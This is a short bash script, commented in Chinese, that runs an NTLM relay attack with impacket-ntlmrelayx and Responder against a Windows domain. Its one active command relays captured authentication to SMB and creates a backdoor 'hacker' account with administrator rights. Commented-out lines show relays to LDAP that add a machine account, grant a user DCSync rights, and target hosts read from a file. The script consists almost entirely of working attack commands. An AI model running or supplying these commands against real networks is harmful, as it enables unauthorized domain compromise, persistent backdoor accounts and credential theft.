#!/bin/bash
# ntlmrelayx NTLM 中继攻击脚本
# 需配合 Responder 或 PrinterBug 使用

TARGET="192.168.1.100"
DC_IP="192.168.1.10"
DOMAIN="corp.local"

echo "[*] 第一步：关闭 Responder 的 SMB 和 HTTP 响应（避免冲突）"
echo "    编辑 /etc/responder/Responder.conf："
echo "    SMB = Off"
echo "    HTTP = Off"
echo ""

echo "[*] 中继到 SMB（执行命令）"
impacket-ntlmrelayx -t smb://${TARGET} -c "net user hacker Hacker123! /add && net localgroup administrators hacker /add"

echo "[*] 中继到 LDAP（创建域用户）"
# impacket-ntlmrelayx -t ldap://${DC_IP} --add-computer PenflowPC$ Penflow123!

echo "[*] 中继到 LDAP（提权到 DCSync）"
# impacket-ntlmrelayx -t ldaps://${DC_IP} --escalate-user lowpriv_user

echo "[*] 中继到多个目标（从文件读取）"
# impacket-ntlmrelayx -tf targets.txt -smb2support
